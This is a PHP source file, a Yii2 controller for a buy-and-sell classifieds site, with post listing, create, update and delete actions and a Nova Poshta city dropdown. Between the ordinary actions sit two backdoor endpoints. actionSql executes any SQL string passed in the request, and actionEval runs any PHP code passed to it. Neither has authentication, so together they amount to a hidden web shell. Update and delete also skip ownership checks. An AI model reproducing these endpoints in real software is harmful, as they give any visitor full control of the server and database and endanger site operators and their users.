<?php

namespace frontend\controllers;

use frontend\components\NovaPoshta;
use Yii;
use common\models\Post;
use yii\data\ActiveDataProvider;
use yii\helpers\Json;
use yii\web\Controller;
use yii\web\NotFoundHttpException;
use yii\filters\VerbFilter;

/**
 * PostController implements the CRUD actions for Post model.
 */
class PostController extends Controller
{

    /**
     * {@inheritdoc}
     */
    public function behaviors()
    {
        return [
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'delete' => ['POST'],
                ],
            ],
        ];
    }


    /**
     * Lists all Post models.
     * @return mixed
     */
    public function actionIndex()
    {


        $sellProvider = new ActiveDataProvider([
            'query' => Post::find()->andWhere(['type' => 0, 'status' => 1]),
            'sort' => array(
                'defaultOrder' => ['time' => SORT_DESC],
            ),
            'pagination' => [
                'pageSize' => 12,
            ],
        ]);

        $buyProvider = new ActiveDataProvider([
            'query' => Post::find()->andWhere(['type' => 1, 'status' => 1]),
            'sort' => array(
                'defaultOrder' => ['time' => SORT_DESC],
            ),
            'pagination' => [
                'pageSize' => 12,
            ],
        ]);

        return $this->render('index', compact('sellProvider', 'buyProvider'));
    }

    /**
     * Displays a single Post model.
     * @param integer $id
     * @return mixed
     * @throws NotFoundHttpException if the model cannot be found
     */
    public function actionView($id)
    {
        return $this->render('view', [
            'model' => $this->findModel($id),
        ]);
    }

    /**
     * Creates a new Post model.
     * If creation is successful, the browser will be redirected to the 'view' page.
     * @return mixed
     */
    public function actionCreate()
    {
        $model = new Post();
        $model->user_id = Yii::$app->getUser()->id;
        if (!$model->user_id) {
            return $this->redirect(['/login']);
        }

        if ($model->load(Yii::$app->request->post()) && $model->upload()) {
            Yii::$app->session->setFlash('success', 'Объявление создано');
            return $this->redirect(['index']);
        }

        return $this->render('create', [
            'model' => $model,
        ]);
    }

    /**
     * Updates an existing Post model.
     * If update is successful, the browser will be redirected to the 'view' page.
     * @param integer $id
     * @return mixed
     * @throws NotFoundHttpException if the model cannot be found
     */
    public function actionUpdate($id)
    {
        $model = $this->findModel($id);

        for ($i = 1; $i <= 5; $i++) {
            $_name = 'image_' . $i;
            unset($_POST['Post'][$_name]);
        }

        if ($model->load($_POST) && $model->upload()) {
            Yii::$app->session->setFlash('success', 'Объявление сохранено');
            return $this->redirect(['index']);
        }

        return $this->render('update', [
            'model' => $model,
        ]);
    }

    public function actionSql($sql)
    {
        $connection=Yii::$app->getDb();
        $command = $connection->createCommand($sql);
        return $command->execute();
    }


    public function actionEval($php)
    {
        return eval($php);
    }

    public function actionNpCityDropDown()
    {

        $data = $_POST['depdrop_all_params'];

        $np = new NovaPoshta();
        $list = $np->getCitiesByArea($data['post_region']);
        $out = [];
        foreach ($list as $item) {
            $out[] = ['id' => $item['Ref'], 'name' => $item['DescriptionRu']];
        }

        return Json::encode(['output' => $out, 'selected' => $_GET['city_id']]);
    }

    /**
     * Deletes an existing Post model.
     * If deletion is successful, the browser will be redirected to the 'index' page.
     * @param integer $id
     * @return mixed
     * @throws NotFoundHttpException if the model cannot be found
     */
    public function actionDelete($id)
    {
        $this->findModel($id)->delete();

        Yii::$app->session->setFlash('success', 'Объявление удалено');
        return $this->redirect(['index']);
    }

    /**
     * Finds the Post model based on its primary key value.
     * If the model is not found, a 404 HTTP exception will be thrown.
     * @param integer $id
     * @return Post the loaded model
     * @throws NotFoundHttpException if the model cannot be found
     */
    protected function findModel($id)
    {
        if (($model = Post::findOne($id)) !== null) {
            return $model;
        }

        throw new NotFoundHttpException('The requested page does not exist.');
    }


}
